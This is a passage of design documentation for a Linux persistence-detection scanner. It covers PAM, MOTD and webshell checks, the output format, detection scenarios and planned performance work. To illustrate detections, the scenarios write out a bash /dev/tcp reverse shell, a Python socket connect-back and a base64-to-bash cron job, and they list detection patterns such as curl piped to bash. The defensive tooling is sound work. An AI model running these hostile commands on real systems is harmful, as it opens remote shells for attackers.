     ├── verified  → LOW
     ├── modified  → CRITICAL (pam_env_conf_ld_preload_modified)
     └── unmanaged → CRITICAL (pam_env_conf_ld_preload_unmanaged)
```

**Step 8 — ~/.pam_environment LD_PRELOAD (root only)**
```
For each user home in /etc/passwd:
  If ~/.pam_environment exists:
    Scan for LD_PRELOAD entries
    For each extracted library path:
    → is_package_managed(lib_path)
       ├── verified  → LOW
       └── unmanaged/modified → CRITICAL (pam_environment_ld_preload)
```

**Step 9 — /etc/security/ General Scan**
```
For each file in /etc/security/:
  → is_package_managed(file)
     ├── verified  → skip
     ├── modified  → CRITICAL (modified_security_config)
     └── unmanaged:
           if file is executable AND analyze_script_content() suspicious
             → HIGH (suspicious_security_script)
           else → skip
```

---

### MOTD Scripts (Module 7 — partial)
```
SCAN: /etc/update-motd.d/*
FLOW:
  1. is_package_managed(motd_file) FIRST
     ├── modified  → CRITICAL (modified_motd_script)
     └── unmanaged → analyze_script_content()
  2. analyze_script_content() on unmanaged scripts
     → suspicious → HIGH
CONFIDENCE: Modified package MOTD → CRITICAL; unmanaged suspicious → HIGH
```

### Backdoor Locations (Module 7)
```
SCAN: APT/YUM configs, git configs (~/.gitconfig for all users), web directories
GIT: credential.helper and suspicious patterns analyzed for all users including non-root
WEBSHELLS: find *.php/*.asp/*.jsp in web dirs; 100-file limit enforced;
           webshell patterns (eval, base64_decode, system(), passthru()) → HIGH
CONFIDENCE: Recently modified + webshell patterns → HIGH
```

---

## Output Schema

### CSV Columns (v2.2.0)
```
timestamp,hostname,category,confidence,file_path,file_hash,
file_owner,file_permissions,file_age_days,package_status,
command,enabled_status,description,matched_pattern,matched_string
```

### JSONL Fields
```json
{
  "timestamp": "2026-02-24T10:30:00Z",
  "hostname": "server01",
  "category": "Systemd Service",
  "confidence": "HIGH",
  "file_path": "/etc/systemd/system/backdoor.service",
  "file_hash": "abc123...",
  "file_owner": "root:root",
  "file_permissions": "644",
  "file_age_days": "3",
  "package_status": "unmanaged",
  "command": "/usr/bin/python3 -c 'import socket...'",
  "enabled_status": "enabled",
  "description": "backdoor.service",
  "matched_pattern": "python.*socket\\.socket",
  "matched_string": "python3 -c 'import socket"
}
```

---

## Example Detection Scenarios

### Scenario 1: Reverse Shell Service
```
Input:  /etc/systemd/system/update.service
        ExecStart=/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

Detection Path:
  1. Extract ExecStart
  2. quick_suspicious_check() → HIT on "bash -i" and "/dev/tcp/"
  3. NEVER_WHITELIST match → CRITICAL
     matched_pattern: "/dev/tcp/"
     matched_string: "/bin/bash -i >& /dev/tcp/10.0.0.1/4444"
```

### Scenario 2: Python Backdoor Script
```
Input:  /etc/systemd/system/monitor.service
        ExecStart=/usr/bin/python3 /opt/monitor.py

        /opt/monitor.py contains:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.0.0.1", 4444))

Detection Path:
  1. Extract ExecStart
  2. is_package_managed(/opt/monitor.py) → unmanaged
  3. analyze_script_content(/opt/monitor.py)
     → Comment stripping applied
     → NEVER_WHITELIST: socket\.socket → MATCH
  4. Result: HIGH confidence
     matched_pattern: "python.*socket\.socket"
     matched_string: "s = socket.socket("
```

### Scenario 3: Legitimate Package-Managed Service
```
Input:  /lib/systemd/system/ssh.service
        ExecStart=/usr/sbin/sshd -D

Detection Path:
  1. Extract ExecStart
  2. quick_suspicious_check() → MISS → skip analysis
  3. is_package_managed(/usr/sbin/sshd)
     → dpkg -S → openssh-server
     → dpkg --verify → PASS (unmodified)
  4. Result: LOW confidence (filtered in default mode)
```

### Scenario 4: Modified System Binary (Rootkit)
```
Input:  /lib/systemd/system/cron.service
        ExecStart=/usr/sbin/cron -f

        /usr/sbin/cron has been replaced (rootkit)

Detection Path:
  1. Extract ExecStart
  2. is_package_managed(/usr/sbin/cron)
     → dpkg -S → cron
     → dpkg --verify cron → MODIFIED
  3. adjust_confidence_for_package() → CRITICAL
     package_status: "dpkg:cron:MODIFIED"
```

### Scenario 5: Base64 Obfuscated Cron Job
```
Input:  /etc/cron.d/backup
        * * * * * root echo 'YmFzaCAtaQ==' | base64 -d | bash

Detection Path:
  1. Read cron content, apply comment stripping
  2. NEVER_WHITELIST: "\| *bash" → MATCH
  3. SUSPICIOUS_COMMANDS: "echo.*\|.*base64.*-d" → MATCH
  4. Result: HIGH confidence
     matched_pattern: "\| *bash"
     matched_string: "| bash"
```

### Scenario 6: Safe Python Import (No False Positive)
```
Input:  /etc/cron.d/metrics
        * * * * * root python3 -c 'import sys; print(sys.version)'

Detection Path:
  1. quick_suspicious_check() → checks UNIFIED pattern
  2. "python.*-c.*import" would match — but pattern is:
     "python.*-c.*import.*(socket|subprocess|pty|ctypes|...)"
     → "import sys" does NOT match the dangerous-module sub-pattern
  3. No other patterns match
  4. Result: LOW / MISS → no finding
```

### Scenario 7: SUID Binary with Suspicious Match
```
Input:  /usr/local/bin/update-helper
        permissions: rwsr-xr-x (SUID set)
        Content matches: "curl.*\|.*bash"

Detection Path:
  1. analyze_script_content() → MATCH → HIGH
  2. add_finding_new() detects file_permissions =~ [sS]
     → confidence HIGH → CRITICAL escalation
  3. Result: CRITICAL confidence
     matched_pattern: "curl.*|.*bash+suid_sgid"
```

### Scenario 8: Recently Modified Shell Profile
```
Input:  /home/user/.bashrc
        Modified 2 days ago
        Contains: PATH modification (MEDIUM confidence)

Detection Path:
  1. check_shell_profiles() → user profile loop
  2. analyze content → confidence=MEDIUM
  3. Time check: days_old=2 < 7 AND confidence==MEDIUM
     → confidence = HIGH
  4. Result: HIGH confidence
     matched_pattern: "recent_modification"
     matched_string: "2 days old"
```

---

## Performance Optimizations

### SCAN_EPOCH Hoisting
```
BEFORE: stat --format="%Y" "$file" called per-file at scan time
AFTER:  SCAN_EPOCH=$(date +%s) captured once at startup
        Per-file: age_days=$(( (SCAN_EPOCH - file_mtime) / 86400 ))
```

### Package Manager Cache
```
First lookup:  dpkg -S /usr/bin/python3 → python3
               Cache: PKG_CACHE["/usr/bin/python3"]="dpkg:python3"

Subsequent:    Cache hit → Skip dpkg call
               Return cached result immediately

Separate PKG_VERIFY_CACHE caches dpkg --verify results
(ownership lookup and integrity check cached independently)
```

### systemctl Cache
```
At startup: init_systemctl_cache() runs:
  systemctl list-units --all --no-pager → SYSTEMCTL_CACHE associative array
  Per-service enabled check: O(1) cache lookup instead of systemctl subprocess
```

### calculate_entropy — Single awk Pass
```
BEFORE: External program + bash arithmetic (multiple subprocesses)
AFTER:  awk one-liner computes Shannon entropy in a single pass
        No external dependencies
```

### Combined Pattern Matching
```
Instead of:
  for pattern in patterns; do
    grep -qE "$pattern"   # N subprocess calls
  done

Now:
  combined="(pattern1|pattern2|...)"
  grep -qE "$combined"    # 1 subprocess call
  if match:
    # Only then loop to find specific pattern
```

### Tail Scan for Large Scripts
```
Files > 1000 lines: read head-1000 + tail-200
Files > 1200 lines: also read mid-200 (N/2 ± 100)
Avoids reading entire multi-MB scripts into memory
```

---

## Future Performance Improvements

These are potential optimizations not yet implemented. Each item includes context
on where the overhead comes from and an estimate of the improvement.

### 1. Replace `echo "$var" | cmd` with `cmd <<< "$var"` (High Impact)

**Where:** ~50 instances across `analyze_script_content()`, `is_package_managed()`,
`get_executable_from_command()`, and the cron/systemd analysis loops.
See lines: 677, 692, 735, 759, 802, 849, 1122, 1128, 1131, 1141, 1144, 1164,
1167, 1181, 1184, 1190, 1193, 1201.

**Why it matters:** `echo "$var" | grep "..."` creates **two** subprocesses — one
fork for `echo` and one for `grep`, connected by a pipe. A bash here-string
(`grep "..." <<< "$var"`) expands the string within the current shell and spawns
only the `grep` subprocess.

**Cost per instance:** ~1–3 ms on a modern Linux system (process fork + exec).

**Estimated total impact:**
```
Typical scan: ~200 services + ~50 cron jobs + ~30 shell profiles
  → analyze_script_content() called ~50 times for unmanaged files
  → ~10 echo-pipe calls per analyze_script_content() invocation
  → 50 × 10 = 500 extra subprocesses
  → At ~2ms each: ~1 second saved
Additional savings from is_package_managed() calls: ~0.5s
Total estimated saving: 1–2 seconds on a typical system scan
```

**Fix:**
```bash
# Before (2 subprocesses):
full_line=$(echo "$script_content_clean" | grep -iE "$PATTERN" | head -1)

# After (1 subprocess):
full_line=$(grep -iE "$PATTERN" <<< "$script_content_clean" | head -1)
```

---

### 2. Bash String Operations Instead of `sed` / `awk` / `cut` (Medium Impact)

**Where (sed trimming):** Lines 1131, 1144, 1184, 1193 — `echo "$line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//'`
**Where (awk first-word):** Line 802 — `echo "$command" | awk '{print $1}'`
**Where (cut field):** Lines 677 — `echo "$dpkg_output" | cut -d':' -f1`
**Where (tr normalize):** Line 849 — `echo "$command" | tr -s '[:space:]' ' '`

**Why it matters:** These are all string manipulation operations on small in-memory
variables. Each one forks a subprocess and passes data through a pipe, only to
return a slightly modified string. Bash can perform all of these operations natively
with zero subprocess overhead.

**Estimated total impact:**
```
sed trim:   called ~4 times per suspicious file × 50 files = 200 calls × 2ms = 0.4s
awk $1:     called once per service/cron entry × ~500 entries = 500 calls × 2ms = 1s
cut:        called in is_package_managed() × ~500 unique files = ~500 calls × 1ms = 0.5s
tr:         called once per interpreter command = minor
Total estimated saving: 1.5–2 seconds
```

**Fixes:**
```bash
# sed trim → bash parameter expansion (0 subprocesses):
str="${str#"${str%%[! ]*}"}"   # ltrim
str="${str%"${str##*[! ]}"}"   # rtrim
str="${str:0:200}"             # truncate

# awk '{print $1}' → bash native (0 subprocesses):
executable="${command%% *}"
# or: read -r executable _ <<< "$command"

# cut -d':' -f1 → bash native (0 subprocesses):
package="${dpkg_output%%:*}"

# tr -s ' ' → read handles it natively (0 subprocesses):
read -ra args <<< "$command"  # IFS already collapses spaces
```

---

### 3. `date -u` Called per Finding (Medium Impact)

**Where:** Line 1527 inside `add_finding_new()`, called for every finding written
to output.

**Why it matters:** On a system with many unmanaged files, `add_finding_new()` can
be called 50–300 times per scan. Each call forks a `date` subprocess. The timestamp
only needs second-level precision and a scan completes in seconds, so all findings
can share a timestamp without meaningful inaccuracy.

**Estimated total impact:**
```
200 findings × 1 date subprocess × ~2ms = 0.4 seconds saved
```

**Fix:**
```bash
# In main(), after build_combined_patterns():
SCAN_TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

# In add_finding_new() — replace line 1527:
# local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")  ← remove
local timestamp="$SCAN_TIMESTAMP"                    ← use pre-computed value
```

---

### 4. Hoist `command -v dpkg/rpm/pacman` to Startup Booleans (Medium Impact)

**Where:** Lines 640, 710, 753 inside `is_package_managed()`.

**Why it matters:** `is_package_managed()` is the most-called function in the entire
script. Even with PKG_CACHE catching file-level repeats, the `command -v dpkg` check
runs on every cache miss. On a scan of 1000 unique file paths, that's 3000 `command -v`
calls — one set per file before the dpkg/rpm/pacman lookup.

`command -v` is a bash built-in, so it's cheaper than external commands, but it still
involves a PATH hash lookup on each call.

**Estimated total impact:**
```
1000 unique paths × 3 command -v checks (dpkg, rpm, pacman) = 3000 built-in calls
Savings: minor per call but cumulative; estimated 0.1–0.2 seconds
More importantly: eliminates the conditional branching overhead at scale
```

**Fix:**
```bash
# In main(), after build_combined_patterns():
HAS_DPKG=false;   command -v dpkg   &>/dev/null && HAS_DPKG=true
HAS_RPM=false;    command -v rpm    &>/dev/null && HAS_RPM=true
HAS_PACMAN=false; command -v pacman &>/dev/null && HAS_PACMAN=true

# In is_package_managed() — replace conditional:
if $HAS_DPKG; then   # was: if command -v dpkg &>/dev/null
```

---

### 5. Parse `/etc/passwd` Once, Cache User Home Directories (Low-Medium Impact)

**Where:** Lines 1635, 2474, 2823, 3809 — four separate modules each independently
iterate through `/etc/passwd` to enumerate user home directories.

**Why it matters:** Each iteration reads `/etc/passwd` in full and loops over all
users. On a system with hundreds of accounts this is minor, but the file is read
4 times unnecessarily. More importantly, it's a maintenance issue — any per-user
scan logic must be duplicated in each loop.

**Estimated total impact:**
```
4 × (read /etc/passwd + iterate N users) → 1 × same
For 100 users: saves 3 file reads and 300 loop iterations
Estimated saving: < 0.1 seconds, but cleans up the code significantly
```

**Fix:**
```bash
# In main(), after init_output:
declare -A USER_HOMES   # USER_HOMES["username"]="/home/username"
declare -a USER_LIST    # ordered for consistent output
while IFS=: read -r _user _ _uid _ _ _home _; do
    if [[ $_uid -ge 1000 ]] || [[ $_uid -eq 0 ]]; then
        USER_HOMES["$_user"]="$_home"
        USER_LIST+=("$_user")
    fi
done < /etc/passwd

# Each module then iterates: for user in "${USER_LIST[@]}"; do home="${USER_HOMES[$user]}"
```

---

### 6. Shell Profile Files Read Twice (Low-Medium Impact)

**Where:** `check_shell_profiles()` reads file content into `$content` via
`head -n 500` (e.g., line 2686), passes it to `quick_suspicious_check`. If that
misses, `analyze_script_content()` is called — which re-reads the same file from
disk via its own `head -n 1000` (line 1092).

**Why it matters:** Two disk reads per profile file. For a system with 10 users
each having 6 profile files = 120 potential double-reads. On warm-cache systems
(Linux page cache) this is negligible, but on cold-cache first scans it adds up.

**Estimated total impact:**
```
60 profile files × 1 extra disk read × ~0.5ms (page cache hit) = 0.03s
On cold cache (NFS mounts, encrypted home dirs): could be 5–50ms per file
Total: 0.03s warm / up to 3s cold cache
```

**Fix:** Either (a) call only `analyze_script_content()` directly (it reads more
thoroughly anyway), or (b) add an optional `content` parameter to
`analyze_script_content()` so already-read content can be passed in.

---

### 7. Module Parallelization (High Impact, High Complexity)

**Where:** `main()` calls the 7 detection modules sequentially (check_systemd,
check_cron, check_shell_profiles, check_init_scripts, check_kernel_and_preload,
check_additional_persistence, check_common_backdoors).

**Why it matters:** Each module is independent — they scan different paths, don't
modify each other's state, and all write to the same output files via append.
On a typical scan, systemd takes ~40%, cron ~25%, shell profiles ~20%, rest ~15%.
Running the top 3 in parallel would nearly halve wall-clock time.

**Estimated total impact:**
```
Sequential:  40s total scan (example)
Parallel (3 workers): ~16s (limited by slowest module)
Estimated saving: 50–60% of wall-clock time
```

**Trade-off:** Bash associative arrays (PKG_CACHE, FILE_METADATA_CACHE,
SYSTEMCTL_CACHE, FILE_HASH_CACHE) are not shared across subshells. Each worker
would start with empty caches, eliminating the cross-module cache benefit. This
means more dpkg/stat calls overall, partially offsetting the parallelism gain.

**Mitigation approach:**
```bash
# Option A: Pre-populate caches from a quick file enumeration before parallelizing
# Option B: Use temp files per module, merge at end (loses caches but gains parallelism)
# Option C: Accept cache loss for the first scan; run sequentially in --baseline mode
```

---

### Summary: Expected Total Improvement

| Optimization | Estimated Saving | Complexity |
|---|---|---|
| 1. echo-pipe → here-string | 1–2s | Low |
| 2. bash string ops (sed/awk/cut) | 1.5–2s | Low |
| 3. date per-finding | 0.4s | Low |
| 4. command -v hoisting | 0.1–0.2s | Low |
| 5. /etc/passwd single parse | <0.1s | Low |
| 6. Shell profile single read | 0.03–3s | Low |
| 7. Module parallelization | 50–60% wall time | High |

**Items 1–6 combined (no parallelization):** ~3–8 seconds saved on a typical 30–60s
scan (5–20% improvement, pure subprocess elimination, zero behavioral change).

**Item 7 (parallelization):** The largest single gain but requires careful handling
of the cache-sharing trade-off. Best implemented after items 1–6 are applied so
each worker is already optimized.

---

## Filter Modes

```
┌─────────────────────────────────────────────────────────────────┐
│                      FILTER MODE LOGIC                          │
└─────────────────────────────────────────────────────────────────┘

Default: FILTER_MODE=suspicious_only
  → Show: MEDIUM, HIGH, CRITICAL
  → Hide: LOW

--all flag: FILTER_MODE=all
  → Show: LOW, MEDIUM, HIGH, CRITICAL

MIN_CONFIDENCE=HIGH:
  → Show: HIGH, CRITICAL only
  → Hide: LOW, MEDIUM

Combination: MIN_CONFIDENCE=HIGH --all
  → Show: HIGH, CRITICAL
  → (--all has no effect when MIN_CONFIDENCE is set)
```

---

## Quick Reference: What Triggers Each Confidence Level

| Confidence | Triggers |
|------------|----------|
| **CRITICAL** | Modified package files (dpkg/rpm verify failed); SUID/SGID bit + suspicious pattern match |
| **HIGH** | NEVER_WHITELIST pattern match; reverse shell indicators; download+execute; obfuscation with execution context; suspicious script content; inline -c/-e code; recent modification (<7d) of MEDIUM-confidence file; suspicious locations |
| **MEDIUM** | Unmanaged files with ambiguous content; unusual but non-definitive configurations |
| **LOW** | Package-managed and integrity-verified files; known-good paths; runtime-managed packages (npm/pip/cargo/go/gems) |
